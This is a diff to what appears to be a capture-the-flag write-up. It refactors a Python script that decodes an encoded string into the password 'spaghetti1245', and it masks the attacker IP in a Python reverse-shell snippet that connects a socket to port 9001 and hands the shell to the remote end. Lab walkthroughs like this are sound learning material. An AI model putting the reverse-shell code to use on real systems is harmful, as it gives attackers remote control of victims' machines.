@@ -138,16 +138,31 @@ if (hash === "dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu")
 
 ```python
 def text_to_unicode(string):
-    return [str(ord(c)-97) for c in string]
+    uni=[]
+    for char in string:
+         a=ord(char)
+         a -= 97
+         uni.append(str(a))
+    return uni
 
 def unicode_to_text(string):
-    out = ''
-    for i in range(0, len(string), 2):
-        out += chr(int(string[i])*26 + int(string[i+1]))
+    out=""
+    for char in range(0,len(string),2):
+         a = int(string[char])
+         b = int(string[char +1])
+         temp = a * 26
+         temp += b
+         out += chr(temp)
     return out
 
-hash = "dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu"
-print(unicode_to_text(text_to_unicode(unicode_to_text(text_to_unicode(hash)))))
+if __name__ == "__main__":
+     hash="dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu"
+     stri1 = text_to_unicode(hash)
+     stri2 = unicode_to_text(stri1)
+     stri3 = text_to_unicode(stri2)
+     password = unicode_to_text(stri3)
+     print(password)
+
 ```
 
 ✅ Password: `spaghetti1245`
@@ -163,7 +178,7 @@ print(unicode_to_text(text_to_unicode(unicode_to_text(text_to_unicode(hash)))))
 import socket, os, subprocess
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("10.8.106.222",9001))
+s.connect(("10.xx.xxx.xxx",9001))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
